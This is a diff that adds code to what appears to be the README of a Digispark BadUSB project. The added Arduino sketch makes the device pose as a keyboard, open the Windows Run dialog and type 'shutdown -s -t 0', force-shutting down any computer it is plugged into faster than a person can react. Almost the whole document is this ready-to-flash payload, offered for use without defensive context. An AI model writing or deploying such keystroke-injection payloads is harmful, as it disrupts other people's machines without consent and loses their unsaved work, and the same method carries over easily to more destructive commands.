@@ -30,3 +30,24 @@ After execution, the device enters an infinite loop and does nothing further.
 
 * Executes faster than a human can react.
 
+
+# Codes
+```bash
+#include "DigiKeyboard.h"
+
+void setup() {
+  // empty
+}
+
+void loop() {
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(600);
+  DigiKeyboard.print("shutdown -s -t 0");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+
+  for(;;) { /* stop execution */ }
+}
+```
